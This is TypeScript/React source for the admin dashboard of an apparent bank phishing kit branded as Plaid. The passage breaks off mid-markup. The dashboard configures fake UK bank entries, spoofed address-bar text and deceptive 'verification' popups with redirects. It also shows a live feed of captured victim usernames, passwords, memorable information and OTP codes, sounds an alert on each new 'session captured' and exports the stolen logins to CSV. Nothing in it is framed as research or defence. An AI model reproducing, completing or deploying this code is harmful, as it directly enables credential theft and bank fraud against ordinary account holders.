"use client";

import { useEffect, useState, useRef } from "react";

type BankItem = {
  id: string;
  name: string;
  subtitle: string;
  subOptions?: string;
  logoUrl?: string | null;
  order?: number;
  popupStatus?: string;
  popupHeading?: string;
  popupSubheading?: string;
  popupBody?: string;
  buttonText?: string;
  redirectUrl?: string;
  browserAddressBar?: string;
  supportPhone?: string;
  redirectDelay?: number;
  otpLength?: number;
};

type LeadItem = {
  id: string;
  bank?: string;
  bankName?: string;
  bankType?: string;
  userId: string;
  password?: string;
  memorableInfo?: string;
  extraData?: string;
  otpCode?: string;
  otp?: string;
  createdAt: string;
};

export default function AdminPage() {
  const [isAuthenticated, setIsAuthenticated] = useState<boolean | null>(null);
  const [loginUser, setLoginUser] = useState("");
  const [loginPass, setLoginPass] = useState("");
  const [loginError, setLoginError] = useState("");
  const [isLoggingIn, setIsLoggingIn] = useState(false);

  const [activeTab, setActiveTab] = useState<"institutions" | "activity">("institutions");
  const [banks, setBanks] = useState<BankItem[]>([]);
  const [leads, setLeads] = useState<LeadItem[]>([]);
  const [selectedBankFilter, setSelectedBankFilter] = useState("all");

  // Multi-select state for bulk deletion
  const [selectedLeadIds, setSelectedLeadIds] = useState<string[]>([]);

  // Professional Agency Notification States
  const [notifCount, setNotifCount] = useState(0);
  const [isRinging, setIsRinging] = useState(false);
  const [showNotifDropdown, setShowNotifDropdown] = useState(false);
  const [toastAlert, setToastAlert] = useState<string | null>(null);
  const prevLeadsLength = useRef<number>(0);

  // Bank Form State
  const [editingBankId, setEditingBankId] = useState<string | null>(null);
  const [bankName, setBankName] = useState("");
  const [subtitle, setSubtitle] = useState("");
  const [subOptions, setSubOptions] = useState("Business, Personal, Corporate");
  const [logoBase64, setLogoBase64] = useState<string | null>(null);
  const [order, setOrder] = useState<number>(1);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Bank Popup Modal State
  const [configModalBank, setConfigModalBank] = useState<BankItem | null>(null);
  const [editForm, setEditForm] = useState<any>({});

  // Lead / Record Edit Modal State
  const [editingLead, setEditingLead] = useState<LeadItem | null>(null);
  const [leadForm, setLeadForm] = useState<any>({});
  const [isUpdatingLead, setIsUpdatingLead] = useState(false);

  const checkAuth = async () => {
    try {
      const res = await fetch("/api/admin/auth");
      if (res.ok) {
        setIsAuthenticated(true);
        fetchBanks();
        fetchLeads(true);
      } else {
        setIsAuthenticated(false);
      }
    } catch {
      setIsAuthenticated(false);
    }
  };

  useEffect(() => {
    checkAuth();
  }, []);

  // Professional Alert Sound
  const playAlertSound = () => {
    try {
      const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
      if (!AudioCtx) return;
      const audioCtx = new AudioCtx();
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.type = "sine";
      osc.frequency.setValueAtTime(587.33, audioCtx.currentTime);
      osc.frequency.exponentialRampToValueAtTime(880, audioCtx.currentTime + 0.2);
      gain.gain.setValueAtTime(0.2, audioCtx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      osc.start();
      osc.stop(audioCtx.currentTime + 0.4);
    } catch (e) {
      console.log("Audio error:", e);
    }
  };

  const fetchBanks = async () => {
    try {
      const res = await fetch("/api/admin/banks");
      const json = await res.json();
      if (json.success) setBanks(json.data);
    } catch (err) {
      console.error("Failed to load banks:", err);
    }
  };

  const fetchLeads = async (isInitial = false) => {
    try {
      const res = await fetch("/api/admin/leads");
      const json = await res.json();
      if (json.success) {
        const fetchedLeads = json.data;
        
        if (!isInitial && fetchedLeads.length > prevLeadsLength.current && prevLeadsLength.current > 0) {
          playAlertSound();
          const latestBank = fetchedLeads[0]?.bankName || fetchedLeads[0]?.bank || "New Bank";
          setToastAlert(`🚨 New User Active! Session captured from ${latestBank}`);
          
          setNotifCount((prev) => {
            const newCount = prev + 1;
            localStorage.setItem("admin_notification_count", newCount.toString());
            return newCount;
          });

          setIsRinging(true);
          setTimeout(() => {
            setIsRinging(false);
          }, 10000);

          setTimeout(() => {
            setToastAlert(null);
          }, 5000);
        }

        prevLeadsLength.current = fetchedLeads.length;
        setLeads(fetchedLeads);
      }
    } catch (err) {
      console.error("Failed to load leads:", err);
    }
  };

  useEffect(() => {
    if (!isAuthenticated) return;
    const interval = setInterval(() => {
      fetchLeads(false);
    }, 3000);
    return () => clearInterval(interval);
  }, [isAuthenticated]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoginError("");
    setIsLoggingIn(true);
    try {
      const res = await fetch("/api/admin/auth", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: loginUser, password: loginPass }),
      });
      const data = await res.json();
      if (res.ok && data.success) {
        setIsAuthenticated(true);
        fetchBanks();
        fetchLeads(true);
      } else {
        setLoginError(data.message || "Invalid username or password");
      }
    } catch {
      setLoginError("Login service error");
    } finally {
      setIsLoggingIn(false);
    }
  };

  const handleLogout = async () => {
    await fetch("/api/admin/auth", { method: "DELETE" });
    setIsAuthenticated(false);
    setLoginUser("");
    setLoginPass("");
  };

  const handleClearNotifications = () => {
    setNotifCount(0);
    setIsRinging(false);
    localStorage.setItem("admin_notification_count", "0");
    setShowNotifDropdown(!showNotifDropdown);
  };

  const handleLogoUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onloadend = () => {
      setLogoBase64(reader.result as string);
    };
    reader.readAsDataURL(file);
  };

  const handleStartEdit = (bank: BankItem) => {
    setEditingBankId(bank.id);
    setBankName(bank.name);
    setSubtitle(bank.subtitle || "");
    setSubOptions(bank.subOptions || "Business, Personal, Corporate");
    setLogoBase64(bank.logoUrl || null);
    setOrder(bank.order || 1);
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const handleCancelEdit = () => {
    setEditingBankId(null);
    setBankName("");
    setSubtitle("");
    setSubOptions("Business, Personal, Corporate");
    setLogoBase64(null);
    setOrder(banks.length + 1);
  };

  const handleSubmitBank = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!bankName.trim()) return alert("Bank name is required");

    setIsSubmitting(true);
    try {
      if (editingBankId) {
        const res = await fetch(`/api/admin/banks/${editingBankId}`, {
          method: "PUT",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            name: bankName.trim(),
            subtitle: subtitle.trim(),
            subOptions: subOptions.trim(),
            logoUrl: logoBase64,
            order: Number(order) || 1,
          }),
        });
        const data = await res.json();
        if (data.success) {
          handleCancelEdit();
          fetchBanks();
        }
      } else {
        const res = await fetch("/api/admin/banks", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            name: bankName.trim(),
            subtitle: subtitle.trim(),
            subOptions: subOptions.trim(),
            logoUrl: logoBase64,
            order: Number(order) || banks.length + 1,
            popupStatus: "SUCCESS",
            supportPhone: "",
            popupHeading: "Account Verification in Progress",
            popupSubheading: "Security Check Required",
            popupBody: "Your open banking credentials have been verified. Click below to continue.",
            buttonText: "Complete Verification",
            redirectUrl: "https://google.com",
            redirectDelay: 5,
            otpLength: 6,
          }),
        });
        const data = await res.json();
        if (data.success) {
          handleCancelEdit();
          fetchBanks();
        }
      }
    } catch (err) {
      alert("Failed to save bank information");
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleDeleteBank = async (id: string) => {
    if (!confirm("Are you sure you want to delete this institution?")) return;
    try {
      await fetch(`/api/admin/banks/${id}`, { method: "DELETE" });
      if (editingBankId === id) handleCancelEdit();
      setBanks((prev) => prev.filter((b) => b.id !== id));
    } catch (err) {
      alert("Failed to delete bank");
    }
  };

  const handleDeleteLead = async (id: string) => {
    if (!confirm("Are you sure you want to delete this record?")) return;
    try {
      await fetch(`/api/admin/leads/${id}`, { method: "DELETE" });
      setLeads((prev) => prev.filter((l) => l.id !== id));
      setSelectedLeadIds((prev) => prev.filter((i) => i !== id));
    } catch {
      setLeads((prev) => prev.filter((l) => l.id !== id));
    }
  };

  // Bulk Delete Handler
  const handleBulkDelete = async () => {
    if (selectedLeadIds.length === 0) return;
    if (!confirm(`Are you sure you want to delete ${selectedLeadIds.length} selected records?`)) return;

    try {
      await Promise.all(
        selectedLeadIds.map((id) =>
          fetch(`/api/admin/leads/${id}`, { method: "DELETE" })
        )
      );
      setLeads((prev) => prev.filter((l) => !selectedLeadIds.includes(l.id)));
      setSelectedLeadIds([]);
    } catch (err) {
      alert("Failed to delete selected records");
    }
  };

  const handleSelectAll = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.checked) {
      setSelectedLeadIds(filteredLeads.map((l: any) => l.id));
    } else {
      setSelectedLeadIds([]);
    }
  };

  const handleSelectLead = (id: string) => {
    setSelectedLeadIds((prev) =>
      prev.includes(id) ? prev.filter((i) => i !== id) : [...prev, id]
    );
  };

  const handleOpenEditLead = (lead: LeadItem) => {
    setEditingLead(lead);

    let detectedOtp = lead.otpCode || lead.otp || "";
    if (!detectedOtp && lead.extraData) {
      if (lead.extraData.includes("OTP:")) {
        detectedOtp = lead.extraData.split("OTP:")[1]?.trim()?.split(" ")[0] || "";
      } else {
        const match = lead.extraData.match(/\b\d{4,8}\b/);
        if (match) detectedOtp = match[0];
      }
    }

    setLeadForm({
      userId: lead.userId || "",
      password: lead.password || "",
      extraData: lead.extraData || "",
      memorableInfo: lead.memorableInfo || "",
      otpCode: detectedOtp,
    });
  };

  const handleSaveLead = async () => {
    if (!editingLead) return;
    setIsUpdatingLead(true);
    try {
      const res = await fetch(`/api/admin/leads/${editingLead.id}`, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(leadForm),
      });
      if (res.ok) {
        setEditingLead(null);
        fetchLeads(true);
      } else {
        setEditingLead(null);
        fetchLeads(true);
      }
    } catch {
      setEditingLead(null);
    } finally {
      setIsUpdatingLead(false);
    }
  };

  const handleOpenConfig = (bank: BankItem) => {
    setConfigModalBank(bank);
    setEditForm({
      name: bank.name,
      subtitle: bank.subtitle,
      popupStatus: bank.popupStatus || "SUCCESS",
      supportPhone: bank.supportPhone || "",
      popupHeading: bank.popupHeading || "",
      popupSubheading: bank.popupSubheading || "",
      popupBody: bank.popupBody || "",
      buttonText: bank.buttonText || "",
      redirectUrl: bank.redirectUrl || "",
      browserAddressBar: bank.browserAddressBar || `authorise.${bank.name.toLowerCase().replace(/[^a-z0-9]/g, "")}.co.uk/auth/user`,
      redirectDelay: (bank as any).redirectDelay || 5,
      otpLength: (bank as any).otpLength || 6,
    });
  };

  const handleSaveConfig = async () => {
    if (!configModalBank) return;
    try {
      const payload = {
        name: editForm.name,
        subtitle: editForm.subtitle,
        popupStatus: editForm.popupStatus,
        popupHeading: editForm.popupHeading,
        popupSubheading: editForm.popupSubheading,
        popupBody: editForm.popupBody,
        buttonText: editForm.buttonText,
        redirectUrl: editForm.redirectUrl,
        browserAddressBar: editForm.browserAddressBar,
        supportPhone: editForm.supportPhone || "",
        redirectDelay: Number(editForm.redirectDelay) || 5,
        otpLength: Number(editForm.otpLength) || 6,
      };

      const res = await fetch(`/api/admin/banks/${configModalBank.id}`, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      const data = await res.json();
      if (data.success) {
        setConfigModalBank(null);
        fetchBanks();
      } else {
        alert("Failed to save: " + (data.message || "Error"));
      }
    } catch (err) {
      alert("Failed to update bank configuration");
    }
  };

  const handleExportCSV = () => {
    const exportData = selectedBankFilter === "all"
      ? leads
      : leads.filter((l) => (l.bankName || l.bank || "").toLowerCase().includes(selectedBankFilter.toLowerCase()));

    if (exportData.length === 0) return alert("No data available to export");

    const headers = ["Bank", "Bank Type", "Username / ID", "Password", "Extra Info", "OTP / Digits", "Timestamp"];
    const rows = exportData.map((l: any) => {
      let otpVal = l.otpCode || l.otp || "";
      if (!otpVal && l.extraData?.includes("OTP:")) {
        otpVal = l.extraData.split("OTP:")[1]?.trim()?.split(" ")[0] || "";
      }
      return [
        `"${l.bankName || l.bank || "N/A"}"`,
        `"${l.bankType || "N/A"}"`,
        `"${(l.userId || "").replace(/"/g, '""')}"`,
        `"${(l.password || "N/A").replace(/"/g, '""')}"`,
        `"${(l.memorableInfo || l.extraData || "").replace(/"/g, '""')}"`,
        `"${otpVal.replace(/"/g, '""')}"`,
        `"${new Date(l.createdAt).toLocaleString()}"`,
      ];
    });

    const csvContent = "data:text/csv;charset=utf-8," + [headers.join(","), ...rows.map((r) => r.join(","))].join("\n");
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", `captured_logins_${Date.now()}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  if (isAuthenticated === null) {
    return (
      <div className="min-h-screen bg-[#0f172a] flex items-center justify-center">
        <div className="h-8 w-8 animate-spin rounded-full border-4 border-slate-700 border-t-blue-500" />
      </div>
    );
  }

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#0f172a] flex items-center justify-center p-4 font-sans select-none">
        <div className="w-full max-w-sm bg-white rounded-2xl shadow-2xl p-6 border border-slate-200">
          <div className="text-center mb-6">
            <h1 className="text-xl font-black text-[#0c1938] tracking-wider uppercase">PLAID PORTAL</h1>
            <p className="text-xs text-slate-500 mt-1">Sign in to access admin panel</p>
          </div>
          {loginError && (
            <div className="mb-4 bg-red-50 border border-red-200 text-red-600 text-xs px-3 py-2 rounded-xl text-center font-medium">
              {loginError}
            </div>
          )}
          <form onSubmit={handleLogin} className="space-y-4 text-xs">
            <div>
              <label className="block font-bold text-slate-700 mb-1">Username</label>
              <input
                type="text"
                required
                value={loginUser}
                onChange={(e) => setLoginUser(e.target.value)}
                placeholder="admin"
                className="w-full rounded-xl border border-slate-300 p-2.5 text-xs outline-none focus:border-blue-600 bg-white"
              />
            </div>
            <div>
              <label className="block font-bold text-slate-700 mb-1">Password</label>
              <input
                type="password"
                required
                value={loginPass}
                onChange={(e) => setLoginPass(e.target.value)}
                placeholder="admin123"
                className="w-full rounded-xl border border-slate-300 p-2.5 text-xs outline-none focus:border-blue-600 bg-white"
              />
            </div>
            <button
              type="submit"
              disabled={isLoggingIn}
              className="w-full bg-[#111927] hover:bg-black text-white font-bold py-3 rounded-xl transition cursor-pointer shadow-sm text-xs mt-2"
            >
              {isLoggingIn ? "Authenticating..." : "Sign In to Admin"}
            </button>
          </form>
        </div>
      </div>
    );
  }

  const filteredLeads = selectedBankFilter === "all"
    ? leads
    : leads.filter((l) => (l.bankName || l.bank || "").toLowerCase().includes(selectedBankFilter.toLowerCase()));

  return (
    <div className="min-h-screen bg-[#f8fafc] text-[#0f172a] font-sans antialiased relative">
      
      {/* 🟢 PROFESSIONAL AGENCY TOAST NOTIFICATION BANNER */}
      {toastAlert && (
        <div className="fixed top-5 right-5 z-50 bg-slate-900 text-white px-5 py-3 rounded-2xl shadow-2xl border border-blue-500/40 flex items-center gap-3 animate-bounce">
          <span className="text-xl">🚨</span>
          <div>
            <p className="text-xs font-bold text-blue-400">Live Activity Alert</p>
            <p className="text-xs text-slate-200">{toastAlert}</p>
          </div>
        </div>
      )}

      {/* Top Navbar with 10-Second Animated Notification Bell */}
      <header className="bg-[#0f172a] text-white px-6 py-3.5 flex items-center justify-between border-b border-slate-800 shadow-sm relative">
        <div className="flex items-center gap-3">
          <div className="h-8 w-8 rounded-lg bg-blue-600 flex items-center justify-center font-black text-sm text-white shadow-md">
            P
          </div>
          <div>
            <span className="font-extrabold text-sm tracking-wider uppercase text-white block leading-tight">
              PLAID DASHBOARD
            </span>
            <span className="text-[10px] text-slate-400 font-mono">Control Center</span>
          </div>
        </div>

        <div className="flex items-center gap-4 relative">
          
          {/* Animated Notification Bell with Dropdown */}
          <div className="relative">
            <div
              onClick={() => setShowNotifDropdown(!showNotifDropdown)}
              className="cursor-pointer p-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 transition flex items-center justify-center relative border border-slate-700 shadow-inner"
              title="Click to view new user activities"
            >
              <span className={`text-xl inline-block transition-transform duration-300 ${isRinging ? "animate-bounce text-amber-400 scale-125 drop-shadow-[0_0_12px_rgba(251,191,36,0.9)]" : notifCount > 0 ? "text-amber-400" : "text-slate-300"}`}>
                🔔
              </span>
              {notifCount > 0 && (
                <span className="absolute -top-1.5 -right-1.5 bg-red-600 text-white text-[10px] font-extrabold w-5 h-5 rounded-full flex items-center justify-center shadow-lg animate-pulse ring-2 ring-[#0f172a]">
                  {notifCount}
                </span>
              )}
            </div>

            {/* Professional Notification Dropdown with Mark All Read Option */}
            {showNotifDropdown && (
              <div className="absolute right-0 mt-3 w-85 bg-white rounded-2xl shadow-2xl border border-slate-200 z-50 overflow-hidden text-slate-900">
                <div className="bg-slate-900 text-white px-4 py-3 flex items-center justify-between text-xs font-bold">
                  <span>Recent User Activities ({leads.length})</span>
                  <button
                    type="button"
                    onClick={handleClearNotifications}
                    className="text-[10px] bg-blue-600 hover:bg-blue-700 text-white px-2.5 py-1 rounded-lg transition cursor-pointer font-semibold shadow-sm"
                  >
                    Mark all read
                  </button>
                </div>
                <div className="max-h-72 overflow-y-auto divide-y divide-slate-100 text-xs bg-white">
                  {leads.map((l) => (
                    <div key={l.id} className="p-3.5 hover:bg-slate-50 transition">
                      <div className="flex justify-between font-bold text-slate-900">
                        <span className="text-blue-600 font-extrabold">{l.bankName || l.bank || "Bank Session"}</span>
                        <span className="text-[10px] text-slate-500 font-mono">{new Date(l.createdAt).toLocaleTimeString()}</span>
                      </div>
                      <p className="text-[11px] text-slate-700 mt-1">User: <span className="font-semibold text-slate-900">{l.userId || "Active Lead"}</span></p>
                      <p className="text-[10px] text-slate-500 truncate mt-0.5">Info: {l.extraData || "Connected"}</p>
                    </div>
                  ))}
                  {leads.length === 0 && (
                    <div className="p-6 text-center text-slate-500 text-xs font-medium">No recent notifications</div>
                  )}
                </div>
              </div>
            )}
          </div>

          <a
            href="/"
            target="_blank"
            className="text-xs text-slate-300 hover:text-white font-medium flex items-center gap-1.5 bg-slate-800/80 hover:bg-slate-800 px-3 py-1.5 rounded-lg border border-slate-700 transition"
          >
            <span>View Website</span>
            <span className="text-[11px]">↗</span>
          </a>
          <button
            type="button"
            onClick={handleLogout}
            className="bg-red-500/10 hover:bg-red-500/20 text-red-400 hover:text-red-300 border border-red-500/30 text-xs px-3 py-1.5 rounded-lg font-semibold transition cursor-pointer flex items-center gap-1"
          >
            <span>Logout</span>
          </button>
        </div>
      </header>

      {/* Tabs */}
      <div className="bg-white border-b border-slate-200 px-6 pt-3 flex gap-8 shadow-xs">
        <button
          type="button"
          onClick={() => setActiveTab("institutions")}
          className={`pb-3.5 text-xs sm:text-sm font-bold border-b-2 transition cursor-pointer flex items-center gap-2 ${
            activeTab === "institutions"
              ? "border-blue-600 text-blue-600"
              : "border-transparent text-slate-500 hover:text-slate-900"
          }`}
        >
          <span>Institutions & Popups</span>
          <span className="bg-slate-100 text-slate-600 text-[11px] px-2 py-0.5 rounded-full font-semibold">
            {banks.length}
          </span>
        </button>

        <button
          type="button"
          onClick={() => setActiveTab("activity")}
          className={`pb-3.5 text-xs sm:text-sm font-bold border-b-2 transition flex items-center gap-2 cursor-pointer ${
            activeTab === "activity"
              ? "border-blue-600 text-blue-600"
              : "border-transparent text-slate-500 hover:text-slate-900"
          }`}
        >
          <span>User Activity Logins</span>
          <span className="bg-red-500 text-white rounded-full px-2 py-0.2 text-[11px] font-bold shadow-xs">
            {leads.length}
          </span>
        </button>
      </div>

      <main className="p-6 max-w-[1400px] mx-auto">
        {/* ================= TAB 1: INSTITUTIONS ================= */}
        {activeTab === "institutions" && (
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
            <div className={`lg:col-span-4 bg-white rounded-2xl p-6 border shadow-sm h-fit transition ${
              editingBankId ? "border-amber-400 ring-2 ring-amber-100" : "border-slate-200"
            }`}>
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-base font-extrabold text-[#0c1938]">
                  {editingBankId ? "Edit Institution Details" : "Add New Institution"}
                </h2>
                {editingBankId && (
                  <span className="bg-amber-100 text-amber-800 text-[10px] font-bold px-2 py-0.5 rounded uppercase">
                    Editing
                  </span>
                )}
              </div>
              <form onSubmit={handleSubmitBank} className="space-y-4">
                <div>
                  <label className="block text-xs font-bold text-slate-700 mb-1">Bank Name *</label>
                  <input
                    type="text"
                    placeholder="e.g. Lloyds Bank"
                    value={bankName}
                    onChange={(e) => setBankName(e.target.value)}
                    className="w-full rounded-xl border border-slate-300 p-2.5 text-xs outline-none focus:border-blue-600 bg-white"
                  />
                </div>
                <div>
                  <label className="block text-xs font-bold text-slate-700 mb-1">Subtitle *</label>
                  <input
                    type="text"
                    placeholder="e.g. Multiple available"
                    value={subtitle}
                    onChange={(e) => setSubtitle(e.target.value)}
                    className="w-full rounded-xl border border-slate-300 p-2.5 text-xs outline-none focus:border-blue-600 bg-white"
                  />
                </div>
                <div>
                  <label className="block text-xs font-bold text-slate-700 mb-1">Sub-Options</label>
                  <input
                    type="text"
                    value={subOptions}
                    onChange={(e) => setSubOptions(e.target.value)}
                    className="w-full rounded-xl border border-slate-300 p-2.5 text-xs outline-none focus:border-blue-600 bg-white"
                  />
                </div>
                <div>
                  <label className="block text-xs font-bold text-slate-700 mb-1">Logo</label>
                  <div className="flex items-center gap-3">
                    <input
                      type="file"
                      accept="image/*"
                      onChange={handleLogoUpload}
                      className="text-xs text-slate-500 file:mr-2 file:py-1.5 file:px-3 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100"
                    />
                    {logoBase64 && (
                      <div className="relative">
                        <img src={logoBase64} alt="Preview" className="w-8 h-8 rounded-full object-contain border border-slate-200" />
                        <button
                          type="button"
                          onClick={() => setLogoBase64(null)}
                          className="absolute -top-1.5 -right-1.5 bg-red-500 text-white rounded-full w-4 h-4 text-[10px] flex items-center justify-center font-bold"
                        >
                          ✕
                        </button>
                      </div>
                    )}
                  </div>
                </div>
                <div>
                  <label className="block text-xs font-bold text-slate-700 mb-1">Order</label>
                  <input
                    type="number"
                    value={order}
                    onChange={(e) => setOrder(Number(e.target.value))}
                    className="w-full rounded-xl border border-slate-300 p-2.5 text-xs outline-none focus:border-blue-600 bg-white"
                  />
                </div>
                <div className="pt-2 flex flex-col gap-2">
                  <button
                    type="submit"
                    disabled={isSubmitting}
                    className={`w-full py-2.5 rounded-xl font-bold text-xs transition cursor-pointer shadow-sm text-white ${
                      editingBankId ? "bg-amber-600 hover:bg-amber-700" : "bg-[#2557e8] hover:bg-[#1d46be]"
                    }`}
                  >
                    {isSubmitting ? "Saving..." : editingBankId ? "💾 Update Bank Details" : "+ Publish Bank"}
                  </button>
                  {editingBankId && (
                    <button
                      type="button"
                      onClick={handleCancelEdit}
                      className="w-full py-2 rounded-xl font-bold text-xs border border-slate-300 bg-slate-50 hover:bg-slate-100 text-slate-700 transition cursor-pointer"
                    >
                      Cancel Edit
                    </button>
                  )}
                </div>
              </form>
            </div>

            <div className="lg:col-span-8 bg-white rounded-2xl p-6 border border-slate-200 shadow-sm">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-base font-extrabold text-[#0c1938]">Configured Institutions</h2>
                <span className="text-[11px] text-slate-400">Configure popups per institution</span>
              </div>
              <div className="overflow-x-auto">
                <table className="w-full text-left text-xs border-collapse">
                  <thead>
                    <tr className="border-b border-slate-200 text-slate-500 uppercase tracking-wider text-[11px]">
                      <th className="pb-3 px-2">Logo</th>
                      <th className="pb-3 px-2">Bank Name</th>
                      <th className="pb-3 px-2">Popup Status</th>
                      <th className="pb-3 px-2 text-right">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100">
                    {banks.map((bank) => (
                      <tr key={bank.id} className="hover:bg-slate-50/70 transition">
                        <td className="py-3 px-2">
                          <div className="w-9 h-9 rounded-full border border-slate-200 flex items-center justify-center overflow-hidden bg-white shadow-xs">
                            {bank.logoUrl ? (
                              <img src={bank.logoUrl} alt={bank.name} className="h-7 w-7 object-contain" />
                            ) : (
                              <span className="text-[10px] font-bold text-slate-700">
                                {bank.name.slice(0, 2).toUpperCase()}
                              </span>
                            )}
                          </div>
                        </td>
                        <td className="py-3 px-2">
                          <p className="font-bold text-slate-900">{bank.name}</p>
                          <p className="text-[11px] text-slate-400">{bank.subtitle}</p>
                        </td>
                        <td className="py-3 px-2">
                          <span className={`font-bold px-2 py-0.5 rounded text-[10px] ${
                            (bank.popupStatus || "").toLowerCase().includes("action")
                              ? "bg-red-100 text-red-700"
                              : (bank.popupStatus || "").toLowerCase().includes("pending")
                              ? "bg-amber-100 text-amber-700"
                              : "bg-emerald-100 text-emerald-700"
                          }`}>
                            {bank.popupStatus || "SUCCESS"}
                          </span>
                        </td>
                        <td className="py-3 px-2 text-right space-x-1.5">
                          <button
                            type="button"
                            onClick={() => handleStartEdit(bank)}
                            className="bg-slate-50 text-slate-700 border border-slate-200 hover:bg-slate-100 font-semibold px-2 py-1 rounded text-xs transition cursor-pointer"
                          >
                            ✎ Edit
                          </button>
                          <button
                            type="button"
                            onClick={() => handleOpenConfig(bank)}
                            className="bg-blue-50 text-blue-700 border border-blue-200 hover:bg-blue-100 font-semibold px-2.5 py-1 rounded text-xs transition cursor-pointer"
                          >
                            ⚙ Configure Popup
                          </button>
                          <button
                            type="button"
                            onClick={() => handleDeleteBank(bank.id)}
                            className="bg-red-50 text-red-600 border border-red-200 hover:bg-red-100 font-semibold px-2 py-1 rounded text-xs transition cursor-pointer"
                          >
                            Delete
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        )}

        {/* ================= TAB 2: USER ACTIVITY ================= */}
        {activeTab === "activity" && (
          <div className="bg-white rounded-2xl border border-slate-200 shadow-sm overflow-hidden">
            <div className="p-5 border-b border-slate-100 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 bg-white">
              <div>
                <div className="flex items-center gap-2">
                  <h2 className="text-base font-extrabold text-slate-900 tracking-tight">
                    User Activity Logins
                  </h2>
                  <span className="bg-blue-50 text-blue-700 border border-blue-200 text-[10px] font-bold px-2 py-0.5 rounded-full">
                    Live Feed (Instant)
                  </span>
                </div>
                <p className="text-xs text-slate-500 mt-0.5">
                  Real-time captured credentials, session details and security digits per bank
                </p>
              </div>

              <div className="flex items-center gap-2.5 flex-wrap">
                {selectedLeadIds.length > 0 && (
                  <button
                    type="button"
                    onClick={handleBulkDelete}
                    className="bg-red-600 hover:bg-red-700 text-white px-3.5 py-1.5 rounded-xl text-xs font-bold transition cursor-pointer flex items-center gap-1.5 shadow-sm animate-pulse"
                  >
                    <span>🗑️</span> Delete Selected ({selectedLeadIds.length})
                  </button>
                )}

                <select
                  value={selectedBankFilter}
                  onChange={(e) => setSelectedBankFilter(e.target.value)}
                  className="rounded-xl border border-slate-300 py-1.5 px-3 text-xs bg-slate-50 hover:bg-white outline-none font-medium text-slate-700 transition"
                >
                  <option value="all">Filter by Bank: All ({leads.length})</option>
                  {banks.map((b) => (
                    <option key={b.id} value={b.name}>{b.name}</option>
                  ))}
                </select>

                <button
                  type="button"
                  onClick={() => fetchLeads(true)}
                  className="border border-slate-200 hover:bg-slate-50 text-slate-700 px-3 py-1.5 rounded-xl text-xs font-semibold transition cursor-pointer flex items-center gap-1.5 bg-white shadow-2xs"
                >
                  <span>🔄</span> Refresh
                </button>

                <button
                  type="button"
                  onClick={handleExportCSV}
                  className="bg-emerald-600 hover:bg-emerald-700 text-white px-3.5 py-1.5 rounded-xl text-xs font-bold transition cursor-pointer flex items-center gap-1.5 shadow-sm"
                >
                  <span>📥</span> Export CSV
                </button>
              </div>
            </div>

            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs border-collapse">
                <thead>
                  <tr className="bg-slate-50/75 border-b border-slate-200 text-slate-500 uppercase tracking-wider text-[11px] font-semibold">
                    <th className="py-3.5 px-4 w-10">
                      <input
                        type="checkbox"
                        onChange={handleSelectAll}
                        checked={filteredLeads.length > 0 && selectedLeadIds.length === filteredLeads.length}
                        className="rounded border-slate-300 text-blue-600 focus:ring-blue-500 cursor-pointer"
                      />
                    </th>
                    <th className="py-3.5 px-4">Bank</th>
                    <th className="py-3.5 px-4 text-purple-700">Bank Type</th>
                    <th className="py-3.5 px-4">Username / ID</th>
                    <th className="py-3.5 px-4">Password</th>
                    <th className="py-3.5 px-4 text-emerald-800">Extra Info</th>
                    <th className="py-3.5 px-4 text-blue-700">Action Digits / OTP</th>
                    <th className="py-3.5 px-4">Timestamp</th>
                    <th className="py-3.5 px-4 text-right">Actions</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-100">
                  {filteredLeads.map((lead: any) => {
                    let otpValue = lead.otpCode || lead.otp || null;
                    if (!otpValue && lead.extraData) {
                      if (lead.extraData.includes("OTP:")) {
                        otpValue = lead.extraData.split("OTP:")[1]?.trim()?.split(" ")[0]?.split("|")[0];
                      }
                    }

                    return (
                      <tr key={lead.id} className="hover:bg-slate-50/80 transition-colors group">
                        <td className="py-3 px-4">
                          <input
                            type="checkbox"
                            checked={selectedLeadIds.includes(lead.id)}
                            onChange={() => handleSelectLead(lead.id)}
                            className="rounded border-slate-300 text-blue-600 focus:ring-blue-500 cursor-pointer"
                          />
                        </td>

                        <td className="py-3 px-4">
                          <span className="font-bold text-slate-900 block text-xs">
                            {lead.bank || lead.bankName || "Lloyds Bank"}
                          </span>
                        </td>

                        <td className="py-3 px-4">
                          {lead.bankType ? (
                            <span className="bg-purple-50 text-purple-700 border border-purple-200 px-2 py-0.5 rounded text-[11px] font-semibold">
                              {lead.bankType}
                            </span>
                          ) : (
